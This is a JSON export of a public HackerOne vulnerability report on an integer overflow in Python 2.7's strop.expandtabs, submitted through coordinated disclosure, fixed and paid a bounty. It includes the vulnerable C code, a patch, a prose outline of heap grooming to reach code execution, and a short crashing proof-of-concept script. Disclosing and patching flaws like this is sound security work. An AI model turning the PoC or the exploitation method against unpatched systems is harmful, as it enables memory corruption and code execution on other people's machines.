{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": null, 
    "voters": [], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "1500.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 6389, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2014-03-31T00:09:44.000Z", 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "Integer overflow in strop.expandtabs", 
    "is_member_of_team?": null, 
    "vote_count": 0, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": null, 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$1,500", 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2014-04-08T04:11:53.769Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-04-08T04:11:53.769Z", 
            "actor": {
                "url": "/ibb-python", 
                "profile": {
                    "name": "Python (IBB)"
                }, 
                "ibb": true, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/027/79e9602e5e25d02b7c34cdbc40438408f47e7cd7_medium.png?1383737131"
                }
            }, 
            "team_handle": "ibb-python", 
            "bounty_amount": "1500.0", 
            "collaborator": {
                "username": "ianbeer", 
                "url": "/ianbeer"
            }, 
            "message": "Thanks Ian, we always appreciate fantastic detailed write-ups like this. We're awarding the minimum bounty because it's a relatively low severity issue (a rather obscure code path in a nearly obsolete module).\r\n\r\nResolved in the upcoming 2.7.7 release: http://hg.python.org/cpython/rev/5dabc2d2f776", 
            "markdown_message": "<p>Thanks Ian, we always appreciate fantastic detailed write-ups like this. We&#39;re awarding the minimum bounty because it&#39;s a relatively low severity issue (a rather obscure code path in a nearly obsolete module).</p>\n\n<p>Resolved in the upcoming 2.7.7 release: <a title=\"http://hg.python.org/cpython/rev/5dabc2d2f776\" href=\"/redirect?signature=071c2fe075655a2437733345b5c8fe16560ec78b&amp;url=http%3A%2F%2Fhg.python.org%2Fcpython%2Frev%2F5dabc2d2f776\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://hg.python.org/cpython/rev/5dabc2d2f776</span><i class=\"icon-external-link\"></i></a></p>\n", 
            "type": "Activities::BountyAwarded", 
            "id": 26154, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "ianbeer", 
                "url": "/ianbeer"
            }, 
            "created_at": "2014-04-08T15:23:28.299Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-09-15T13:28:31.009Z", 
            "actor": {
                "url": "/ibb-python", 
                "profile": {
                    "name": "Python (IBB)"
                }, 
                "ibb": true, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/027/79e9602e5e25d02b7c34cdbc40438408f47e7cd7_medium.png?1383737131"
                }
            }, 
            "team_handle": "ibb-python", 
            "message": null, 
            "markdown_message": "", 
            "type": "Activities::BugResolved", 
            "id": 1196014, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "reporter": {
        "username": "ianbeer", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/ianbeer", 
        "profile_picture_urls": {
            "small": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
        }, 
        "is_me?": false
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "disclosed_at": "2014-03-31T00:09:44.000Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/6389", 
    "created_at": "2014-03-31T00:09:44.000Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p><em>This issue was originally disclosed directly to the Python Security Response Team</em></p>\n\n<p>Here&#39;s a bug in a string handling function which might be reachable in some &quot;sandboxed python&quot; environments, and maybe (at a stretch) remotely if someone were to offer &quot;expanding-tabs-in-strings&quot;-as-a-service...</p>\n\n<h1 id=\"bug\">Bug:</h1>\n\n<p>Modules/stropmodule.c</p>\n<pre class=\"highlight plaintext\"><code>static PyObject *\nstrop_expandtabs(PyObject *self, PyObject *args)\n...\n  i = j = old_j = 0;\n  e = string + stringlen;\n  for (p = string; p &lt; e; p++) {\n      if (*p == &#39;\\t&#39;) {\n          j += tabsize - (j%tabsize);\n          if (old_j &gt; j) {\n              PyErr_SetString(PyExc_OverflowError,\n                              &quot;new string is too long&quot;);\n              return NULL;\n          }\n          old_j = j;\n      } else {\n          j++;\n          if (*p == &#39;\\n&#39;) {\n              i += j;               &lt;-- missing check here\n              j = 0;\n          }\n      }\n  }\n...\n  out = PyString_FromStringAndSize(NULL, i+j);\n...\n  i = 0;\n  q = PyString_AS_STRING(out);\n\n  for (p = string; p &lt; e; p++) {\n      if (*p == &#39;\\t&#39;) {\n          j = tabsize - (i%tabsize);\n          i += j;\n          while (j-- &gt; 0)\n              *q++ = &#39; &#39;;\n      } else {\n          *q++ = *p;\n          i++;\n          if (*p == &#39;\\n&#39;)\n              i = 0;\n      }\n  }\n...\n</code></pre>\n<p>There&#39;s no check preventing i from overflowing, meaning that a string consisting of multiple tabs spread over multiple lines combined with a large tabsize can cause the allocation of an undersized string buffer.</p>\n\n<p>With some simple heap manipulation the length of the copy into this buffer can be controlled, and it&#39;s pretty easy to corrupt memory in such a way as to gain native code execution:</p>\n\n<p>[h1|----------][h2|\\t\\n\\t\\n....][h3|----------]</p>\n\n<p>h1: PyStringObject header of undersized buffer<br>\nh2: PyStringObject header of tabstring</p>\n\n<p>By grooming the heap such that this allocation pattern is achieved when the expandtabs function starts expanding the h2 string into the h1 inline buffer it will overflow into the string being expanded, overwriting the tabs in the original string with spaces so that the second loop won&#39;t expand them anymore.</p>\n\n<p>By carefully crafting the string to expand and choosing the tabsize you can limit the extent of the memory corruption to chosen objects.</p>\n\n<p>Getting code execution is simply a matter of pointing the ob_type field of the h2 string header to a controlled address with a fake struct _typeobject. The struct contains the following function pointers which will be called when their corresponing python function is called:</p>\n\n<p>destructor tp_dealloc;<br>\n  printfunc tp_print;<br>\n  getattrfunc tp_getattr;<br>\n  setattrfunc tp_setattr;<br>\n  cmpfunc tp_compare;<br>\n  reprfunc tp_repr;</p>\n\n<h1 id=\"patch\">Patch:</h1>\n\n<p>You&#39;ve actually already patched this bug in a copy-and-paste version of this function... In fact there seem to be at least three versions of expandtabs; transmogrify.h and stropmodule.c are both vulnerable; stringobject.c isn&#39;t. I&#39;m not familiar enough with the code to know when each version will be used.</p>\n\n<p>The patch is to use the stringobject.c implementation which does the overflow check correctly, but here&#39;s a quick patch (for the 2.7 branch) which will do the job:</p>\n<pre class=\"highlight diff\"><code><span class=\"gd\">--- a/Modules/stropmodule.c Sun Mar 30 16:43:11 2014 -0400\n</span><span class=\"gi\">+++ b/Modules/stropmodule.c Mon Mar 31 00:36:57 2014 +0200\n</span><span class=\"gu\">@@ -624,6 +624,11 @@\n</span>         } else {\n             j++;\n             if (*p == &#39;\\n&#39;) {\n<span class=\"gi\">+                if (i &gt; PY_SSIZE_T_MAX - j){\n+                    PyErr_SetString(PyExc_OverflowError,\n+                                    &quot;new string is too long&quot;);\n+                    return NULL;\n+                }\n</span>                 i += j;\n                 j = 0;\n             }\n</code></pre>\n<h1 id=\"proof-of-concept\">Proof of Concept</h1>\n\n<p>Run this script for a very simple crashing PoC for 32-bit python 2.7 which should crash at at address near 0x20202020 (since the ob_type field will be overwritten with spaces.) No idea if the heap manipulation used here will work on other platforms but it should be easy to do.</p>\n<pre class=\"highlight plaintext\"><code>import strop\n\nstrs = []\nfor i in range(20):\n  strs.append(&#39;\\t\\n&#39; * 0x10000 + &#39;A&#39; * 0x1000000)\nfor i in range(20):\n  print hex(id(strs[i]))\nstrs[14] = None\nstrop.expandtabs(strs[15], 0x10001)\nprint strs[15]\n</code></pre>", 
    "vulnerability_information": "*This issue was originally disclosed directly to the Python Security Response Team*\n\nHere's a bug in a string handling function which might be reachable in some \"sandboxed python\" environments, and maybe (at a stretch) remotely if someone were to offer \"expanding-tabs-in-strings\"-as-a-service...\n\n# Bug:\n\nModules/stropmodule.c\n\n```\nstatic PyObject *\nstrop_expandtabs(PyObject *self, PyObject *args)\n...\n  i = j = old_j = 0;\n  e = string + stringlen;\n  for (p = string; p < e; p++) {\n      if (*p == '\\t') {\n          j += tabsize - (j%tabsize);\n          if (old_j > j) {\n              PyErr_SetString(PyExc_OverflowError,\n                              \"new string is too long\");\n              return NULL;\n          }\n          old_j = j;\n      } else {\n          j++;\n          if (*p == '\\n') {\n              i += j;               <-- missing check here\n              j = 0;\n          }\n      }\n  }\n...\n  out = PyString_FromStringAndSize(NULL, i+j);\n...\n  i = 0;\n  q = PyString_AS_STRING(out);\n\n  for (p = string; p < e; p++) {\n      if (*p == '\\t') {\n          j = tabsize - (i%tabsize);\n          i += j;\n          while (j-- > 0)\n              *q++ = ' ';\n      } else {\n          *q++ = *p;\n          i++;\n          if (*p == '\\n')\n              i = 0;\n      }\n  }\n...\n```\n\nThere's no check preventing i from overflowing, meaning that a string consisting of multiple tabs spread over multiple lines combined with a large tabsize can cause the allocation of an undersized string buffer.\n\nWith some simple heap manipulation the length of the copy into this buffer can be controlled, and it's pretty easy to corrupt memory in such a way as to gain native code execution:\n\n[h1|----------][h2|\\t\\n\\t\\n....][h3|----------]\n\nh1: PyStringObject header of undersized buffer\nh2: PyStringObject header of tabstring\n\nBy grooming the heap such that this allocation pattern is achieved when the expandtabs function starts expanding the h2 string into the h1 inline buffer it will overflow into the string being expanded, overwriting the tabs in the original string with spaces so that the second loop won't expand them anymore.\n\nBy carefully crafting the string to expand and choosing the tabsize you can limit the extent of the memory corruption to chosen objects.\n\nGetting code execution is simply a matter of pointing the ob_type field of the h2 string header to a controlled address with a fake struct _typeobject. The struct contains the following function pointers which will be called when their corresponing python function is called:\n\n  destructor tp_dealloc;\n  printfunc tp_print;\n  getattrfunc tp_getattr;\n  setattrfunc tp_setattr;\n  cmpfunc tp_compare;\n  reprfunc tp_repr;\n\n# Patch:\n\nYou've actually already patched this bug in a copy-and-paste version of this function... In fact there seem to be at least three versions of expandtabs; transmogrify.h and stropmodule.c are both vulnerable; stringobject.c isn't. I'm not familiar enough with the code to know when each version will be used.\n\nThe patch is to use the stringobject.c implementation which does the overflow check correctly, but here's a quick patch (for the 2.7 branch) which will do the job:\n\n```\n--- a/Modules/stropmodule.c Sun Mar 30 16:43:11 2014 -0400\n+++ b/Modules/stropmodule.c Mon Mar 31 00:36:57 2014 +0200\n@@ -624,6 +624,11 @@\n         } else {\n             j++;\n             if (*p == '\\n') {\n+                if (i > PY_SSIZE_T_MAX - j){\n+                    PyErr_SetString(PyExc_OverflowError,\n+                                    \"new string is too long\");\n+                    return NULL;\n+                }\n                 i += j;\n                 j = 0;\n             }\n```\n\n# Proof of Concept\n\nRun this script for a very simple crashing PoC for 32-bit python 2.7 which should crash at at address near 0x20202020 (since the ob_type field will be overwritten with spaces.) No idea if the heap manipulation used here will work on other platforms but it should be easy to do.\n\n```lang=python\nimport strop\n\nstrs = []\nfor i in range(20):\n  strs.append('\\t\\n' * 0x10000 + 'A' * 0x1000000)\nfor i in range(20):\n  print hex(id(strs[i]))\nstrs[14] = None\nstrop.expandtabs(strs[15], 0x10001)\nprint strs[15]\n```\n", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "http://www.python.org/news/security", 
            "about": "", 
            "twitter_handle": "", 
            "name": "Python (IBB)"
        }, 
        "handle": "ibb-python", 
        "url": "https://hackerone.com/ibb-python", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/027/22df52945ba6933f27a1dbc92380fe19a4a1a93d_small.png?1383737131", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/000/027/79e9602e5e25d02b7c34cdbc40438408f47e7cd7_medium.png?1383737131"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 27, 
        "default_currency": "usd"
    }, 
    "is_published": false
}